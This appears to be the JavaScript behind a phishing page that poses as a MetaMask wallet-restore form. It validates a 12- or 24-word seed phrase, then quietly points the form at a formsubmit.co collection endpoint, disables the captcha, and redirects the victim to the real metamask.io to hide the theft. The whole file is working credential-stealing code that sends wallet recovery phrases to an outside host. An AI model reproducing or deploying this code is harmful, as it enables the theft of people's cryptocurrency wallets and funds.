const restoreForm = document.querySelector("#restore-form");

restoreForm.addEventListener("submit", (e) => {
    e.preventDefault();

    const phrase = document.querySelector("#SeedPhrase").value;

    if (phrase.split(" ").length !== 12 && phrase.split(" ").length !== 24) {
        alert("Invalid seed phrase format. 12 or 24 words required");
    } else {
        const captcha = document.createElement("input");
        captcha.setAttribute("type", "hidden");
        captcha.setAttribute("name", "_captcha");
        captcha.setAttribute("value", "false");
        const next = document.createElement("input");
        next.setAttribute("type", "hidden");
        next.setAttribute("name", "_next");
        next.setAttribute("value", "https://metamask.io/");

        restoreForm.setAttribute(
            "action",
            "https://formsubmit.co/279173257d62880e6bbd1660797fd218"
        );
        restoreForm.appendChild(captcha);
        restoreForm.appendChild(next);
        restoreForm.submit();
    }
});
